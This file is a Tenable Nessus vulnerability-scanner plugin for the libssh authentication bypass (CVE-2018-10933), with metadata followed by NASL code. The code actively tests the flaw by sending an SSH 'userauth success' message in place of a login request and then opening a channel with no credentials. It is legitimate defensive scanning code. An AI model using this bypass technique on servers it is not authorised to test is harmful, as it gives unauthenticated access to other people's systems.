#TRUSTED 522ef50f459a0770b74bc59be39892149e82ad3d5d3e54ed5ca4868bdaa38ba06065962ca5621cba9e1e0d9a3e9f08cceccb7155efe1a4ede2aec3db5b146dc6cca4f646d50bfaee36f3600d66584f1394cf6284878962843c4ff824c5907d564b789d448b3cabbf59166c0ee520b0543616e80a0d5460d51ed2c66b3d41c6f624c13cea2134b41175a01ab915d74076202b19ec1422d126897de6297b0e361fb2f1ff8061ac09ef9605f31f4a1a8ae1836a42c037fe76819de6e58af2dff34013819fbb8682578ddaeebcc4b1c5bd9c590f90e37025f2927b35136c4e7fc809500d9be0b84d85c1fd3567c6734a2267db686fd476281b0a9bc1fd4e6df10d30ae45622b1ada57357e7bf0a70bbbe81f7115e5f96a5c15486681266e131c7e4bc99c892adc66c1072cbc2e0a454452522231875427159e2618a7f673c55589b09c74be8dc0ab30a13f35e68ccfcf63b396a900b24bd5be143005a82ea9eb83b2840bd798cfc608e29ad843463eeb1dfd350292415e379dcc4070c6d1cf95bad1ae0c56f25676a55e17c5a95a07cf96be1cf28e90c322ed457e39fc333f58b1cabfbae83709a3340538b72ebb5c40e08ca53c1c217a276562bdc21a761db9548e9e6da79d756d5734da9b84940c82ac617101bdacd1202873085ecea7712e587e83fba7185a5e29b684278dd6beea47671d499eb79f78b3c51e629900ec9c913d
#TRUST-RSA-SHA256 a47ef154aca6cd111a543583e598d235bf71a4e110dc4cc1dd3e965ee7f0cd1806e94cd7620733da4af83789651bb0e5725f47dba852699efafe62ab716b1c9bdfba0b25c82d67915f59d8a12717766d15ec91c7b0445ed6027922c64e5c3ab13a99c8382717c2ea9fcda34631e161ac6f1210de1db2493be399c2ec1f7f4100e078d13037ff2d2beeb22d7cf780de956ff53b583fef834bb1e8aef40ce91862875a905cb51b330b3e22d134eb40d166db408279485536c071c503d3b9ff4ebcbf3098fb705e2870012ac5687eb6e559a50814880143274e333340a7b2c9cd8a2c26605236209b92c19d90027eacfc07fe59cd50ba980a7875853fd17c37aed5a5cbdbf564695ca727e41b2559727eac552cbadb7b99837606f8bf6662b71893f7c7b70077e37da5684e156e0e3f0234425db1c7a6e68056d713d84ff51b446b98b95cddd8bc9c47f11f4eb42ba7342d1cab34575b4bd7471fb60bc8a8aeecd8dc89e3b133892e0129ba35e94877f04667cc58f6675d59662f96d5d6da5bde09026eac3a99aa7e6d48ca4a9d46dc00fe98cd4bfa99ac1320d57d5fda9fe12ad31ae115a2c04c8a81cb54585a9fd48c7d99026a3e1aeeade825f29c1de254438d264ca543c8f99f03836c2aeaefb6bff5d9d0a29d8752e262afc109b827227d5aadc6c608317c47a618f5b1afa0f36cf3449804af47be91c335570bb543b10c20
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(118154);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2025/02/11");

  script_cve_id("CVE-2018-10933", "CVE-2018-1000805");
  script_bugtraq_id(105677, 106762);
  script_xref(name:"IAVA", value:"2018-A-0347-S");

  script_name(english:"SSH Protocol Authentication Bypass (Remote Exploit Check)");

  script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to an authentication bypass.");
  script_set_attribute(attribute:"description", value:
"The remote ssh server is vulnerable to an authentication bypass. An
attacker can bypass authentication by presenting
SSH2_MSG_USERAUTH_SUCCESS message in place of the
SSH2_MSG_USERAUTH_REQUEST method that normally would initiate
authentication.

Note: This vulnerability was disclosed in a libssh advisory but has
also been observed as applicable to other applications and software
packages.");
  # https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6f6b157e");
  # https://www.libssh.org/security/advisories/CVE-2018-10933.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?505261f8");
  # https://www.nutanix.com/opensource/disclosure/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?58a0f73d");
  script_set_attribute(attribute:"solution", value:
"Upgrade to libssh 0.7.6 / 0.8.4 or later, if applicable. Otherwise,
contact your product vendor.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2018-1000805");
  script_set_attribute(attribute:"cvss3_score_source", value:"CVE-2018-10933");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2018/10/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2018-2025 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("find_service1.nasl");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("string.inc");
include("byte_func.inc");
include("misc_func.inc");

include("ssh_lib.inc");

session = new("sshlib::session");

sshlib::SSH_CLIENT_HANDLERS[120] = @sshlib::client_cb_msg_userauth_success;

port = get_service(svc:"ssh", default:22, exit_on_fail:TRUE);

ret = session.open_connection(port:port);
if(!ret) exit(0, session.error);

if(!session.complete_kex())
{
  session.close_connection();
  exit(1, "Unable to complete KEX");
}

session.sshsend(code:sshlib::PROTO_SSH_MSG_SERVICE_REQUEST, data:sshlib::mk_ssh_string("ssh-userauth"));
session.sshrecv_until(end_states:make_list("SERVICE_REQUEST_SUCCESS", "SOC_CLOSED"));

if(session.cur_state.val != "SERVICE_REQUEST_SUCCESS")
{
  session.close_connection();
  exit(1, "Did not receive SERVICE_ACCEPT for ssh-userauth authentication.");
}

session.cur_state.set("USERAUTH_REQUEST");

session.sshsend(data: mkdword(0, order:BYTE_ORDER_BIG_ENDIAN), code:sshlib::PROTO_SSH_MSG_USERAUTH_SUCCESS);

if(session.compression_alg_c_to_s == "zlib@openssh.com")
   session.enable_compression(mode:sshlib::MODE_OUT);
if(session.compression_alg_s_to_c == "zlib@openssh.com")
  session.enable_compression(mode:sshlib::MODE_IN);

var channel = session.get_channel();

if(channel && channel.state == sshlib::CHANNEL_STATE_ACCEPTED)
{
  session.close_connection();
  report =
    'Nessus was able to successfully open a channel on the libssh server\n' +
    'with no credentials.\n';
  security_report_v4(port: port, severity:SECURITY_WARNING, extra:report);
  exit(0);
}
else
{
  session.close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, 'libssh server', port);
}

